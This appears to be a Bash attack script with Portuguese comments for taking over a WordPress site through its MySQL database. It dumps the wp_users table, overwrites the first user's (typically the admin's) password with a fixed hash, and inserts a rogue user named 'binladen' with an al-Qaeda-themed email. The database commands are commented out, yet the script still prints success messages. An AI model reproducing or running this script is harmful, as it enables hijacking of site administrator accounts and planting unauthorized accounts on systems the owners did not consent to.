#!/bin/bash

##### (Cores)
RED="\033[01;31m"
GREEN="\033[01;32m"
YELLOW="\033[01;33m"
BLUE="\033[01;34m"
BOLD="\033[01;01m"
RESET="\033[00m"
#### (Config Site)
db_name='#'
db_user='#'
db_pass='#'
db_host='mysql.#####.com.br'
#### (Id, primeira id do usario)
id=1
#### (Nova Senha)
n_pass='$P$BeZiobCs7WNKp1mkSzhhh2liuy'
#### (Backup do Banco-Tabela)
bkp=$db_host

pasta=$(mkdir $bkp)

#DUMP .SQL
#mysqldump -h $db_host -u $db_user -p$db_pass --opt $db_name wp_users > ~/$bkp/$bkp.sql
echo -e " ${BOLD}[+]${YELLOW} Dump, ${RED} Feito${RESET}"
#UPADTE USUARIO
#mysql -h $db_host -u $db_user -p$db_pass -e "USE $db_name; UPDATE wp_users SET user_pass ='$n_pass' WHERE wp_users.ID=$id;"
echo -e " ${BOLD}[+]${BLUE} Update, ${RED} Feito${RESET}"
#INSERIR NOVO USUARIO
#mysql -h $db_host -u $db_user -p$db_pass -e "USE $db_name; INSERT INTO wp_users VALUES (667, 'binladen', '$n_pass', 'bin', 'bin_laden@alqaeda.com.sa', '', '2011-05-01 00:00:00', '', 1, 'Bin Laden');"
echo -e " ${BOLD}[+]${GREEN} Novo${GREEN} usuario, ${RED} Feito"
